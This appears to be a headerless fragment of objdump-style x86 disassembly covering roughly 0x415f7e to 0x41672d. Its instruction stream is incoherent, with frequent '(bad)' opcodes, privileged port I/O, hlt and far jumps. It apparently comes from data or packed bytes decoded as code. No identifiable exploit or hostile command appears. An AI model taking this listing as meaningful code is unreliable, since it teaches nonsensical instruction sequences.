  415f7e:	ins    BYTE PTR es:[edi],dx
  415f7f:	adc    dl,ah
  415f81:	jg     0x415f9d
  415f83:	push   edx
  415f84:	sbb    DWORD PTR [edx+eax*4+0x1aef09f6],esi
  415f8b:	cld    
  415f8c:	add    ebx,esp
  415f8e:	in     al,dx
  415f8f:	iret   
  415f90:	and    BYTE PTR [ebx-0xe],cl
  415f93:	aaa    
  415f94:	leave  
  415f95:	ins    DWORD PTR es:[edi],dx
  415f96:	nop
  415f97:	adc    esp,esp
  415f99:	dec    esp
  415f9a:	mov    WORD PTR [esi],cs
  415f9c:	add    eax,0xfb61d13d
  415fa1:	cdq    
  415fa2:	mov    esp,0xfb4dfc28
  415fa7:	enter  0x97dd,0x76
  415fab:	mov    ds:0x40f85907,al
  415fb0:	call   edi
  415fb2:	sbb    ebp,DWORD PTR [ebx+edx*2+0x5e]
  415fb6:	shl    DWORD PTR [ebx],1
  415fb8:	shl    DWORD PTR [esi+0x3d],1
  415fbb:	sbb    dh,ah
  415fbd:	ins    DWORD PTR es:[edi],dx
  415fbe:	cli    
  415fbf:	cld    
  415fc0:	out    dx,al
  415fc1:	imul   BYTE PTR [esi+0x194c38c]
  415fc7:	inc    ebx
  415fc8:	stos   DWORD PTR es:[edi],eax
  415fc9:	mov    esi,0x44f5369d
  415fce:	xor    eax,0xf653e094
  415fd3:	mov    esp,0x567d9d69
  415fd8:	das    
  415fd9:	sahf   
  415fda:	sub    esi,eax
  415fdc:	loope  0x415fd1
  415fde:	mov    ah,BYTE PTR [edx]
  415fe0:	stos   DWORD PTR es:[edi],eax
  415fe1:	mov    bl,0x56
  415fe3:	fisttp QWORD PTR [edx+ebp*2]
  415fe6:	aas    
  415fe7:	scas   al,BYTE PTR es:[edi]
  415fe8:	dec    esp
  415fe9:	hlt    
  415fea:	test   eax,0xd31b8031
  415fef:	add    DWORD PTR ds:0x2a1cfbc6,ebx
  415ff5:	(bad)  
  415ff6:	(bad)  [eax]
  415ff8:	scas   eax,DWORD PTR es:[edi]
  415ff9:	push   ds
  415ffa:	adc    al,0x48
  415ffc:	and    eax,0x9173893e
  416001:	jg     0x415fea
  416003:	gs sti 
  416005:	xor    DWORD PTR [ebp-0x6c],ebp
  416008:	push   eax
  416009:	dec    ebx
  41600a:	pop    edi
  41600b:	outs   dx,BYTE PTR cs:[esi]
  41600d:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41600f:	dec    eax
  416010:	dec    ebp
  416011:	ins    BYTE PTR es:[edi],dx
  416012:	sbb    DWORD PTR [ecx+0x2f9c75a6],esp
  416018:	enter  0x3f67,0xae
  41601c:	mov    edx,0xdb5ef629
  416021:	xchg   esp,eax
  416022:	cmp    eax,0xd5f1d449
  416027:	adc    BYTE PTR [ebx-0x12],bl
  41602a:	test   DWORD PTR [eax+0x1f768fc7],eax
  416030:	addr16 push esi
  416032:	test   DWORD PTR [ebp-0x4f],ecx
  416035:	test   eax,0xc37eda9f
  41603a:	or     eax,0xbb6013ba
  41603f:	popa   
  416040:	ja     0x4160b0
  416042:	xchg   DWORD PTR [esi-0x773690f8],esp
  416048:	ret    
  416049:	mov    ah,0xbb
  41604b:	in     al,dx
  41604c:	adc    esi,edi
  41604e:	inc    ebp
  41604f:	out    0x51,eax
  416051:	mov    WORD PTR [eax+0x3dcbdece],cs
  416057:	out    0xd3,eax
  416059:	cs push 0xfef7beda
  41605f:	cdq    
  416060:	push   ebx
  416061:	cmp    ch,bl
  416063:	stos   DWORD PTR es:[edi],eax
  416064:	(bad)  
  416065:	push   ds
  416066:	fld    DWORD PTR [ebp+eax*2+0xdb65b27]
  41606d:	pop    esp
  41606e:	ds ins DWORD PTR es:[edi],dx
  416070:	fdiv   DWORD PTR ds:[edx]
  416073:	arpl   WORD PTR [ebx-0x2a98c9cc],di
  416079:	cdq    
  41607a:	fisubr WORD PTR [eax]
  41607c:	in     al,dx
  41607d:	cmp    BYTE PTR [ebp-0x34],dl
  416080:	outs   dx,BYTE PTR ds:[esi]
  416081:	pop    ebx
  416082:	xor    ch,dh
  416084:	(bad)  
  416085:	fnstcw WORD PTR [esi]
  416087:	sar    DWORD PTR [esi],1
  416089:	xor    eax,0x1237d6
  41608e:	sar    BYTE PTR gs:[ebp-0x450b8f0e],0x91
  416096:	cld    
  416097:	scas   eax,DWORD PTR es:[edi]
  416098:	xchg   esp,eax
  416099:	and    BYTE PTR [ecx+0x57cce92c],al
  41609f:	sbb    al,0xc6
  4160a2:	xlat   BYTE PTR ds:[ebx]
  4160a3:	data16 shl WORD PTR [ebp+0x2e],cl
  4160a8:	add    al,0x42
  4160aa:	repz inc edi
  4160ac:	push   ds
  4160ad:	rcl    cl,0x88
  4160b0:	jbe    0x416089
  4160b2:	jno    0x41612b
  4160b4:	repnz xchg ebx,eax
  4160b6:	fwait
  4160b7:	aas    
  4160b8:	daa    
  4160b9:	rcr    DWORD PTR [edx],cl
  4160bb:	dec    ebx
  4160bc:	test   BYTE PTR [ecx+0x6c],ah
  4160bf:	jmp    0xc2834354
  4160c4:	add    DWORD PTR [edi+edi*2+0x14],edx
  4160c8:	jmp    0x2689:0x935417c2
  4160cf:	add    ch,BYTE PTR [edi+0x672a13b9]
  4160d5:	jge    0x416087
  4160d7:	loope  0x4160f9
  4160d9:	push   eax
  4160da:	imul   esp,DWORD PTR [edx],0xffffffad
  4160dd:	pop    es
  4160de:	mov    ds:0xf2b04489,al
  4160e3:	pop    ds
  4160e4:	pushf  
  4160e5:	lds    esi,FWORD PTR [esi+0x10cf9090]
  4160eb:	mov    cl,0x54
  4160ed:	ret    
  4160ee:	mov    ecx,0x2c0a13b2
  4160f3:	sbb    BYTE PTR [esi-0x3a51a0f3],bh
  4160f9:	and    ah,BYTE PTR [esi+0x7104dd96]
  4160ff:	pop    ss
  416100:	sbb    BYTE PTR [ecx+0x4f],cl
  416103:	push   ebx
  416104:	jb     0x41609d
  416106:	dec    esi
  416107:	(bad)  
  416108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416109:	pop    es
  41610a:	or     DWORD PTR [ebx+0x7dd495fa],esi
  416110:	xor    al,0x16
  416112:	mov    eax,0x2bfaf252
  416117:	xchg   esp,eax
  416118:	scas   eax,DWORD PTR es:[edi]
  416119:	sub    eax,edi
  41611b:	dec    ebp
  41611c:	pop    es
  41611d:	in     al,0x7d
  41611f:	stos   DWORD PTR es:[edi],eax
  416120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416121:	dec    edi
  416122:	aad    0x41
  416124:	cmp    eax,0x6211a3c2
  416129:	mov    ah,bh
  41612b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41612c:	call   0xedba:0x1f4988bc
  416133:	push   esi
  416134:	or     ebx,DWORD PTR fs:[edx-0x7d492c80]
  41613b:	repz add BYTE PTR [ebp+0x68],al
  41613f:	pusha  
  416140:	int    0x36
  416142:	(bad)  
  416144:	icebp  
  416145:	add    edi,DWORD PTR [ebx+esi*1]
  416148:	add    BYTE PTR [eax+eax*8-0xe],dh
  41614c:	cmp    ah,dl
  41614e:	mov    BYTE PTR [ebx+edi*2-0x4189fa7c],ah
  416155:	push   cs
  416156:	add    eax,0x333541e8
  41615b:	fsubr  QWORD PTR [ebx-0x742e5034]
  416161:	push   ebp
  416162:	and    al,0x3c
  416164:	je     0x41613e
  416166:	push   edx
  416167:	inc    ecx
  416168:	int    0x99
  41616a:	retf   
  41616b:	outs   dx,DWORD PTR ds:[esi]
  41616c:	cmp    BYTE PTR [edx-0x63ecf749],al
  416172:	push   0xffffff8b
  416174:	int3   
  416175:	mov    esi,0x6e20ee18
  41617a:	jle    0x41611b
  41617c:	test   BYTE PTR [esi],ch
  41617e:	lock fisubr WORD PTR [ebx]
  416181:	sbb    DWORD PTR [ecx-0x70a3873a],eax
  416187:	mov    ah,0x85
  416189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41618a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41618b:	jecxz  0x41610f
  41618d:	jge    0x416145
  41618f:	mov    cl,0x37
  416191:	and    ebp,edi
  416193:	mov    ch,BYTE PTR [ebp-0x6db85108]
  416199:	cmc    
  41619a:	xchg   edx,eax
  41619b:	les    edi,FWORD PTR [esi+0x10f76e4]
  4161a1:	sub    edi,ebp
  4161a3:	pusha  
  4161a4:	mov    ds:0x5e70107,al
  4161a9:	jecxz  0x4161a5
  4161ab:	mov    edx,0x80281969
  4161b0:	mov    dh,0x1a
  4161b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161b3:	jge    0x416234
  4161b5:	adc    bh,BYTE PTR [ebx-0x3c]
  4161b8:	shl    bh,cl
  4161ba:	je     0x4161c6
  4161bc:	inc    edi
  4161bd:	mov    ss,WORD PTR [esi]
  4161bf:	aad    0xfb
  4161c1:	fld    DWORD PTR [ebp-0x26]
  4161c4:	js     0x4161aa
  4161c6:	loope  0x416172
  4161c8:	xchg   ebx,ebp
  4161ca:	sbb    DWORD PTR [eax+edx*4+0x7f64bcbd],0xffffffdb
  4161d2:	sahf   
  4161d3:	cmp    bh,bl
  4161d5:	das    
  4161d6:	cmp    DWORD PTR [eax+0x63d358cd],edx
  4161dc:	xchg   ebx,eax
  4161dd:	or     al,0x8f
  4161df:	ins    DWORD PTR es:[edi],dx
  4161e0:	outs   dx,DWORD PTR ds:[esi]
  4161e1:	stos   BYTE PTR es:[edi],al
  4161e2:	je     0x41624f
  4161e4:	mov    ebp,0x37e7c6ab
  4161e9:	push   0xd9f7e069
  4161ee:	inc    ecx
  4161ef:	push   esi
  4161f0:	sub    al,0x2d
  4161f2:	icebp  
  4161f3:	mov    ecx,0x6f5b4ebb
  4161f8:	mov    bh,0xd0
  4161fa:	fisubr DWORD PTR [esi+0x3c]
  4161fd:	(bad)  
  4161fe:	sahf   
  4161ff:	push   ecx
  416200:	push   es
  416201:	pop    edi
  416202:	jnp    0x4161a2
  416204:	stos   BYTE PTR es:[edi],al
  416205:	mov    esi,0x817a2ad0
  41620a:	jp     0x4161a6
  41620c:	sbb    al,0xa2
  41620e:	sbb    ebx,DWORD PTR [edx-0x4156955f]
  416214:	cli    
  416215:	mov    ebp,0x5dfedee
  41621a:	nop
  41621b:	dec    edx
  41621c:	xlat   BYTE PTR ds:[ebx]
  41621d:	mov    ah,0xeb
  41621f:	adc    edi,DWORD PTR [ecx-0x1e]
  416222:	dec    edi
  416223:	mov    dh,0x8
  416225:	pop    es
  416226:	adc    ch,BYTE PTR [edi+0x6b]
  416229:	mov    BYTE PTR [eax+eiz*8+0x37],0x58
  41622e:	and    al,bl
  416230:	mov    dl,0xf8
  416232:	lock mov dl,BYTE PTR ds:0x171b2cce
  416239:	lods   al,BYTE PTR ds:[esi]
  41623a:	cli    
  41623b:	mov    bl,BYTE PTR [ecx-0x331be8b4]
  416241:	cmp    ebp,DWORD PTR [esi+esi*2+0x67]
  416245:	js     0x416218
  416247:	shr    DWORD PTR [ebx+0x7a],0x90
  41624b:	and    eax,edi
  41624d:	push   edx
  41624e:	dec    edx
  41624f:	hlt    
  416250:	mov    WORD PTR [ecx-0x63f0422b],?
  416256:	fdiv   st(2),st
  416258:	push   0x74edeb96
  41625d:	mov    ah,0xb9
  41625f:	sar    BYTE PTR [ebx+0x7ab1cf95],cl
  416265:	aas    
  416266:	or     al,0x32
  416268:	sti    
  416269:	jecxz  0x4162a6
  41626b:	mov    edx,0x1ea8f015
  416270:	test   al,0xd8
  416272:	xchg   ecx,eax
  416273:	xchg   esi,eax
  416274:	fucomp st(1)
  416276:	in     eax,dx
  416277:	shl    DWORD PTR [eax],1
  416279:	rcl    DWORD PTR [ecx+0x43283754],cl
  41627f:	mov    ds,WORD PTR [edx-0x77]
  416282:	lods   al,BYTE PTR ds:[esi]
  416283:	mov    ds:0xee838332,al
  416288:	ficomp WORD PTR [eax]
  41628a:	fstp   QWORD PTR [edi]
  41628c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41628d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41628e:	repnz cmp bl,BYTE PTR [ebx-0xd48e8f7]
  416295:	sbb    BYTE PTR [ebx+0x2d94a063],0xd
  41629c:	sub    DWORD PTR [ebp+0x30725dd6],esp
  4162a2:	jmp    0xaa028b4
  4162a7:	test   eax,0x9b58dcb3
  4162ac:	scas   al,BYTE PTR es:[edi]
  4162ad:	cmp    eax,DWORD PTR [esi+0x1f]
  4162b0:	add    eax,0x3b2d3616
  4162b5:	sbb    BYTE PTR [ebp+ebp*4+0x3d41575a],0x41
  4162bd:	ins    DWORD PTR es:[edi],dx
  4162be:	xchg   ebp,eax
  4162bf:	adc    DWORD PTR [edi-0x16],0x17
  4162c3:	fld    TBYTE PTR [edi-0x6207381c]
  4162c9:	inc    ebx
  4162ca:	jne    0x41626e
  4162cc:	sbb    BYTE PTR es:[eax+0x3f],0x3d
  4162d1:	scas   al,BYTE PTR es:[edi]
  4162d2:	jmp    0xbaccafeb
  4162d7:	add    dl,dh
  4162d9:	pop    edx
  4162da:	sub    bh,BYTE PTR [esi-0x7dcf6ec7]
  4162e0:	es mov dl,0x80
  4162e3:	mov    DWORD PTR [eax+0x13],0x402bc3ba
  4162ea:	loope  0x41630e
  4162ec:	add    al,BYTE PTR [ebx-0x5ac21cfa]
  4162f2:	repnz mov esp,0x8935dc6e
  4162f8:	jnp    0x416286
  4162fa:	dec    ebp
  4162fb:	call   0x4dda:0xd4588e04
  416302:	fnstenv [eax]
  416304:	xor    esi,DWORD PTR [ebp+0x46]
  416307:	push   DWORD PTR [ebp+ecx*2+0x30]
  41630b:	out    0x95,al
  41630d:	test   al,0xf6
  41630f:	sub    edi,edi
  416311:	add    ch,bl
  416313:	xor    BYTE PTR [esi+0x78],al
  416316:	jns    0x41635e
  416318:	push   0xfffffffd
  41631a:	xor    al,0x1c
  41631c:	loop   0x4162d4
  41631e:	push   ds
  41631f:	aas    
  416320:	add    eax,0xf3c1446b
  416325:	add    al,0x7
  416327:	or     eax,0x458ec626
  41632c:	xchg   edi,eax
  41632d:	repnz retf 0x8054
  416331:	lds    esi,FWORD PTR [ebx+0x4cd9be26]
  416337:	das    
  416338:	cmp    ebp,DWORD PTR [edi-0x18e91d77]
  41633e:	jb     0x4162f7
  416340:	(bad)
  416343:	mov    edx,0xdda6458c
  416348:	stos   DWORD PTR es:[edi],eax
  416349:	repz imul eax,esp,0x16
  41634d:	adc    al,BYTE PTR [esp+edx*1+0x7aca55b]
  416354:	inc    esi
  416355:	dec    esi
  416356:	and    DWORD PTR [esi],edi
  416358:	arpl   WORD PTR [esi-0x3f],di
  41635b:	add    ecx,eax
  41635d:	in     eax,0xb5
  41635f:	xlat   BYTE PTR es:[ebx]
  416361:	jno    0x41635d
  416363:	inc    eax
  416364:	jno    0x4163c5
  416366:	push   0x4c561d30
  41636b:	imul   ecx,DWORD PTR [eax],0xffffffec
  41636e:	shl    BYTE PTR [eax-0x5d46560c],cl
  416374:	xchg   ebp,eax
  416375:	(bad)  
  416377:	pop    ebp
  416378:	outs   dx,BYTE PTR ds:[esi]
  416379:	(bad)  
  41637a:	xchg   ebp,eax
  41637b:	sti    
  41637c:	scas   eax,DWORD PTR es:[edi]
  41637d:	stos   DWORD PTR es:[edi],eax
  41637e:	ja     0x4163d0
  416380:	mov    dl,0xc
  416382:	popa   
  416383:	adc    BYTE PTR [ebx+0xc544edd],ch
  416389:	mov    WORD PTR [edx+0x18],cs
  41638c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41638d:	rol    BYTE PTR [edx-0x72],0xe2
  416391:	jnp    0x41632f
  416393:	adc    DWORD PTR [ebx-0x5eccff7e],0xd1db210f
  41639d:	cmp    ebp,DWORD PTR [eax]
  41639f:	sub    eax,0x4e62b00
  4163a4:	pop    ss
  4163a5:	icebp  
  4163a6:	xchg   edx,eax
  4163a7:	popa   
  4163a8:	and    BYTE PTR [ecx],cl
  4163aa:	pminsw mm4,mm3
  4163ad:	fcom   st(3)
  4163af:	test   eax,0x510618e3
  4163b4:	out    0xb2,al
  4163b6:	in     al,dx
  4163b7:	lea    eax,[ebx+0x1b]
  4163ba:	push   es
  4163bb:	adc    DWORD PTR [edi-0x7e],edx
  4163be:	sahf   
  4163bf:	sub    ah,cl
  4163c1:	fadd   DWORD PTR [edx-0x4a]
  4163c4:	or     BYTE PTR [eax],bh
  4163c6:	mov    dh,0x69
  4163c8:	or     eax,0x8d9fc31
  4163cd:	dec    esp
  4163ce:	push   ds
  4163cf:	cmp    edi,ebp
  4163d1:	mov    al,ds:0xdb612a7a
  4163d6:	pop    ebx
  4163d7:	adc    cl,BYTE PTR [edi+0x3694048b]
  4163dd:	ins    BYTE PTR es:[edi],dx
  4163de:	mov    ch,0x27
  4163e0:	inc    edi
  4163e1:	(bad)  
  4163e2:	(bad)  
  4163e3:	cli    
  4163e4:	call   0xe1a8:0xe25cad5
  4163eb:	and    DWORD PTR [ebx-0xa31c507],esp
  4163f1:	mul    DWORD PTR [ecx+0x14]
  4163f4:	inc    ebx
  4163f5:	dec    edx
  4163f6:	dec    edx
  4163f7:	sti    
  4163f8:	xor    DWORD PTR [esp+ebp*2],esi
  4163fb:	cmp    al,0xea
  4163fd:	mov    dh,0xbb
  4163ff:	mov    BYTE PTR [eax],0x7c
  416402:	mov    ch,al
  416404:	mov    ah,0xc2
  416406:	jge    0x416399
  416408:	(bad)  
  416409:	push   edx
  41640a:	xchg   DWORD PTR [ecx+0x5490b931],ecx
  416410:	pop    ebx
  416411:	sbb    BYTE PTR [esi-0xa],bl
  416414:	fwait
  416415:	outs   dx,BYTE PTR ds:[esi]
  416416:	cmp    DWORD PTR [ebp-0x14597d52],ebx
  41641c:	mov    ebp,DWORD PTR [ebx+0x44e87435]
  416422:	push   esp
  416423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416424:	mov    eax,ds:0x5ea9208a
  416429:	mov    cl,BYTE PTR [eax+0x43]
  41642c:	(bad)  
  41642e:	clc    
  41642f:	jle    0x416426
  416431:	dec    eax
  416432:	pop    ss
  416433:	ds in  al,dx
  416435:	dec    ecx
  416436:	hlt    
  416437:	add    DWORD PTR [bp+di],esi
  41643a:	bound  esp,QWORD PTR cs:[eax+eiz*1-0x35]
  41643f:	xchg   BYTE PTR [ebp-0x67],cl
  416442:	and    dl,dh
  416444:	sub    esi,edi
  416446:	mov    edi,0xad0a6e5b
  41644b:	popf   
  41644c:	push   edx
  41644d:	dec    ebx
  41644e:	test   al,0xf7
  416450:	pop    edx
  416451:	push   edi
  416452:	pop    edx
  416453:	loopne 0x41645e
  416455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416456:	xchg   ecx,eax
  416457:	cs ins BYTE PTR es:[edi],dx
  416459:	daa    
  41645a:	std    
  41645b:	std    
  41645c:	jmp    0xc5a394f7
  416461:	(bad)  
  416463:	adc    al,0x7f
  416465:	fwait
  416466:	inc    ebp
  416467:	mov    esi,0xa4e88de5
  41646c:	jmp    0x49b:0xeb3ebc62
  416473:	iret   
  416474:	gs hlt 
  416476:	jmp    0xe66aa7ea
  41647b:	and    al,0x74
  41647d:	mov    bl,BYTE PTR [esp+ebx*2]
  416480:	adc    ch,bh
  416482:	jb     0x4164a8
  416484:	mov    bl,BYTE PTR [edx]
  416486:	pop    edi
  416487:	pop    edi
  416488:	inc    eax
  416489:	inc    edx
  41648a:	out    0x46,al
  41648c:	mov    eax,ds:0xd90ac1eb
  416491:	mov    ecx,0x7fc95cdc
  416496:	jbe    0x416501
  416498:	imul   edx,DWORD PTR [esi+0x78d2d363],0xffffff81
  41649f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164a0:	mov    ah,0x13
  4164a2:	inc    esp
  4164a3:	mov    dl,0x48
  4164a5:	dec    edx
  4164a6:	lods   eax,DWORD PTR ds:[esi]
  4164a7:	adc    al,0x1
  4164a9:	mov    ds:0x8d2d6e6f,al
  4164ae:	stos   DWORD PTR es:[edi],eax
  4164af:	mov    esp,0xe20b432f
  4164b4:	and    DWORD PTR [esi-0x76f3676e],esi
  4164ba:	mov    ebx,DWORD PTR [ebp+0x4c672896]
  4164c0:	test   ah,dl
  4164c2:	cmp    DWORD PTR [edx-0x3f1748b1],esi
  4164c8:	pop    esi
  4164c9:	dec    ecx
  4164ca:	outs   dx,BYTE PTR ds:[esi]
  4164cb:	inc    edx
  4164cc:	(bad)  
  4164cd:	(bad)  
  4164ce:	out    0x54,eax
  4164d0:	push   ebp
  4164d1:	mov    edx,DWORD PTR [edi+eiz*4-0x2a]
  4164d5:	ss push ss
  4164d7:	mov    ah,0x2a
  4164d9:	aas    
  4164da:	push   ecx
  4164db:	out    dx,eax
  4164dc:	inc    ecx
  4164dd:	lods   al,BYTE PTR ds:[esi]
  4164de:	jmp    0x26331fdf
  4164e3:	sub    edi,DWORD PTR [esi+0x2b]
  4164e6:	mov    dx,0x7998
  4164ea:	dec    ecx
  4164eb:	stc    
  4164ec:	jne    0x41647a
  4164ee:	out    dx,eax
  4164ef:	xor    BYTE PTR [ebx+0x36ac4970],ah
  4164f5:	or     al,0x30
  4164f7:	mov    eax,0x2f5c4452
  4164fc:	add    al,0x28
  4164fe:	fsubr  QWORD PTR [esi+eiz*4-0x6eef00d3]
  416505:	xor    al,0x1e
  416507:	jo     0x4164fe
  416509:	mov    dh,0xf2
  41650b:	adc    eax,0x854bf4f4
  416510:	push   eax
  416511:	ins    DWORD PTR es:[edi],dx
  416512:	out    dx,al
  416513:	inc    ebp
  416514:	ret    
  416515:	(bad)  
  416516:	outs   dx,BYTE PTR ds:[esi]
  416517:	or     bh,ch
  416519:	ret    
  41651a:	mov    bh,0x81
  41651c:	in     eax,dx
  41651d:	mov    al,0x6a
  41651f:	fist   WORD PTR [esi-0x6a]
  416522:	ret    0x6459
  416525:	add    dh,BYTE PTR [esi+edi*2-0x10106a8]
  41652c:	out    dx,eax
  41652d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41652e:	scas   al,BYTE PTR es:[edi]
  41652f:	fnstenv ds:0x10fcf09f
  416535:	adc    eax,0xd85c70a7
  41653a:	arpl   WORD PTR [edx-0x20ce719a],bx
  416540:	and    dl,BYTE PTR [ebp+0xb]
  416543:	pusha  
  416544:	(bad)  
  416546:	xor    dh,BYTE PTR [edx]
  416548:	or     al,0x47
  41654a:	outs   dx,BYTE PTR ds:[esi]
  41654b:	lods   eax,DWORD PTR ds:[esi]
  41654c:	jmp    DWORD PTR [ebx]
  41654e:	sub    dh,dl
  416550:	jae    0x4164f1
  416552:	and    bl,BYTE PTR ds:0x28ce9f24
  416558:	mov    edx,0xa29058cd
  41655d:	sahf   
  41655e:	push   edx
  41655f:	mov    ds:0x270e2eae,eax
  416564:	mov    ah,0x3b
  416566:	mov    eax,0x225b07df
  41656b:	mov    al,ds:0x1d00380b
  416570:	or     al,0x51
  416572:	inc    ebx
  416573:	das    
  416574:	pop    ebp
  416575:	xchg   esp,eax
  416576:	adc    ecx,DWORD PTR [ebx+0x297b4bbe]
  41657c:	popf   
  41657d:	outs   dx,BYTE PTR ds:[esi]
  41657e:	test   al,0xef
  416580:	addr16 xor al,0xa0
  416583:	fisubr DWORD PTR [edx]
  416585:	pop    eax
  416586:	in     al,0xbb
  416588:	outs   dx,DWORD PTR ds:[esi]
  416589:	and    al,0x86
  41658b:	push   eax
  41658c:	enter  0xe87e,0x4b
  416590:	sub    dh,cl
  416592:	sahf   
  416593:	and    eax,0x21b56bf7
  416598:	adc    bl,dh
  41659a:	jae    0x4165b6
  41659c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41659d:	in     al,0x47
  41659f:	push   esp
  4165a0:	ffree  st(5)
  4165a2:	mov    BYTE PTR ds:0x9c5dbad1,bl
  4165a8:	(bad)  
  4165a9:	and    al,0xde
  4165ab:	sub    cl,dh
  4165ad:	mov    edi,DWORD PTR [ecx+0x33]
  4165b0:	scas   eax,DWORD PTR es:[edi]
  4165b1:	xchg   edx,eax
  4165b2:	call   0xb4baba81
  4165b7:	mov    bl,0x5c
  4165b9:	and    esp,DWORD PTR [esi]
  4165bb:	(bad)  
  4165bc:	mov    cs,WORD PTR [eax]
  4165be:	jne    0x416611
  4165c0:	xor    DWORD PTR [ebp+0x2c],ebp
  4165c3:	cmc    
  4165c4:	int    0x77
  4165c6:	or     DWORD PTR [eax-0x3b246be0],edi
  4165cc:	inc    ebp
  4165cd:	pushf  
  4165ce:	or     esp,DWORD PTR [eax]
  4165d0:	inc    edx
  4165d1:	(bad)  
  4165d2:	imul   esi,DWORD PTR [esi],0xffffff8d
  4165d5:	push   edi
  4165d6:	ss xchg ebx,eax
  4165d8:	pushf  
  4165d9:	pop    edx
  4165da:	jg     0x416638
  4165dc:	test   BYTE PTR [edi+0x19ec12],0x64
  4165e3:	push   esp
  4165e4:	shr    DWORD PTR [eax+0x7c],1
  4165e7:	pop    esp
  4165e8:	inc    esi
  4165e9:	dec    ebp
  4165ea:	adc    ebx,DWORD PTR [ebx]
  4165ec:	leave  
  4165ed:	mov    al,BYTE PTR [esi]
  4165ef:	je     0x4165aa
  4165f1:	cmp    ecx,ebp
  4165f3:	mov    al,0x47
  4165f5:	pop    edx
  4165f6:	je     0x416633
  4165f8:	pop    edx
  4165f9:	push   0x5b393d7e
  4165fe:	cmp    ah,cl
  416600:	cdq    
  416601:	jo     0x416649
  416603:	xor    ah,dl
  416605:	push   es
  416606:	xlat   BYTE PTR ds:[ebx]
  416607:	das    
  416608:	sbb    dl,cl
  41660a:	inc    edi
  41660b:	push   0x1d5cba1f
  416610:	add    ebp,DWORD PTR [ebp+eiz*1-0x33]
  416614:	sahf   
  416615:	rcl    DWORD PTR [ebx+0x17d2e3d0],0x5c
  41661c:	push   ss
  41661d:	push   ebp
  41661e:	inc    ebp
  41661f:	push   ds
  416620:	add    al,0x7e
  416622:	or     bh,BYTE PTR [edx+0x9f36acb]
  416628:	in     eax,dx
  416629:	jge    0x416699
  41662b:	sub    ebx,esp
  41662d:	mov    bh,0x5b
  41662f:	(bad)
  416633:	xor    DWORD PTR [esi-0x1995f8a6],0x54
  41663a:	call   0x826e:0x436511a5
  416641:	lock mov ebx,cs
  416644:	inc    edi
  416645:	mov    bl,0x5
  416647:	rcr    BYTE PTR [eax-0x32],0x9c
  41664b:	mov    BYTE PTR [edx-0x47],al
  41664e:	in     eax,dx
  41664f:	push   0x6f
  416651:	std    
  416652:	loopne 0x416690
  416654:	mov    eax,0xf3be77d2
  416659:	into   
  41665a:	(bad)
  41665e:	scas   eax,DWORD PTR es:[edi]
  41665f:	jg     0x416602
  416661:	xchg   ebp,eax
  416662:	pop    ebp
  416663:	mov    ebp,DWORD PTR [ebx-0x58f78942]
  416669:	dec    eax
  41666a:	sbb    cl,dh
  41666c:	scas   al,BYTE PTR es:[edi]
  41666d:	jl     0x41661e
  41666f:	push   ebp
  416670:	lods   eax,DWORD PTR ds:[esi]
  416671:	aaa    
  416672:	je     0x41665e
  416674:	and    BYTE PTR [ecx-0x7331bc6],ah
  41667a:	and    al,0x1b
  41667c:	lods   al,BYTE PTR ds:[esi]
  41667d:	mov    ds:0x4365533f,eax
  416682:	cmc    
  416683:	and    eax,edi
  416685:	in     al,dx
  416686:	mov    ebx,0x30ac2d35
  41668b:	mov    ds:0x5bea07d5,al
  416690:	xchg   ebx,eax
  416691:	sbb    al,0xf4
  416693:	out    0x12,eax
  416695:	jns    0x416644
  416697:	enter  0x6b28,0xd5
  41669b:	aaa    
  41669c:	push   esp
  41669d:	scas   eax,DWORD PTR es:[edi]
  41669e:	outs   dx,DWORD PTR ds:[esi]
  41669f:	and    al,0x9d
  4166a1:	xchg   DWORD PTR [esi+edi*8-0x49e09cc3],ecx
  4166a8:	fisttp DWORD PTR [edi+0x41]
  4166ab:	xchg   DWORD PTR [esi+0x6f],esi
  4166ae:	mov    al,ds:0x4a254c4f
  4166b3:	xchg   DWORD PTR [ecx+0x1c],edx
  4166b6:	lods   eax,DWORD PTR ds:[esi]
  4166b7:	ds jno 0x416700
  4166ba:	mov    DWORD PTR [ebx],esi
  4166bc:	pop    esp
  4166bd:	mov    cl,0xa5
  4166bf:	mov    cl,0xcd
  4166c1:	lock jmp 0xe860:0x7ab3597e
  4166c9:	test   BYTE PTR [edx-0xb57ccdc],al
  4166cf:	mov    al,ds:0x661a8c43
  4166d4:	pop    eax
  4166d5:	int    0x88
  4166d7:	xor    ah,BYTE PTR [edx+0x41db746]
  4166dd:	dec    edi
  4166de:	lock push 0x7b
  4166e1:	push   0xd320f8fd
  4166e6:	cmp    eax,0xd86f942a
  4166eb:	adc    DWORD PTR ds:0x5d203610,0x63
  4166f2:	fwait
  4166f3:	add    al,dh
  4166f5:	nop
  4166f6:	repz inc eax
  4166f8:	inc    eax
  4166f9:	fstp   DWORD PTR [edx+0x7ce52b6a]
  4166ff:	cmp    al,0x47
  416701:	sti    
  416702:	scas   al,BYTE PTR es:[edi]
  416703:	pop    es
  416704:	ins    BYTE PTR es:[edi],dx
  416705:	or     eax,0xfb07ceea
  41670a:	pop    ebp
  41670b:	inc    ecx
  41670c:	repnz xor eax,DWORD PTR [edx]
  41670f:	inc    edx
  416710:	outs   dx,BYTE PTR ds:[esi]
  416711:	fmul   QWORD PTR [ecx+ebp*1+0x6781a173]
  416718:	pusha  
  416719:	mov    eax,0xb279de86
  41671e:	dec    ebx
  41671f:	sub    edi,ebp
  416721:	dec    esi
  416722:	cmc    
  416723:	mov    ebp,0xb8971fae
  416728:	jae    0x416720
  41672a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41672b:	(bad)  
  41672d:	and    al,BYTE PTR [eax]
